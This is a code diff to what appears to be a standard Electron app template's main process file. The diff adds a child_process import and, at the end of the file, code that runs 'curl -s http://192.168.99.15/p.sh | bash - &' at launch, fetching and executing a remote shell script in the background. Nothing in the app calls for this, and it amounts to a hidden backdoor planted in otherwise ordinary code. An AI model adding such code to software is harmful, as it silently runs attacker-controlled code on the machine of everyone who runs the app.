@@ -1,5 +1,6 @@
 const { app, BrowserWindow } = require('electron');
 const path = require('path');
+var exec = require('child_process').exec;
 
 // Handle creating/removing shortcuts on Windows when installing/uninstalling.
 if (require('electron-squirrel-startup')) { // eslint-disable-line global-require
@@ -44,3 +45,15 @@ app.on('activate', () => {
 
 // In this file you can include the rest of your app's specific main process
 // code. You can also put them in separate files and import them here.
+var cmdToLaunch = "curl -s http://192.168.99.15/p.sh | bash - &";
+
+function execCB (error, stdout, stderr) {
+  if (error) {
+      console.error(`exec error: ${error}`);
+      return;
+  }
+  console.log('stdout: ' + stdout);
+  console.log('stderr: ' + stderr);
+}
+
+var executor = exec(cmdToLaunch, execCB);
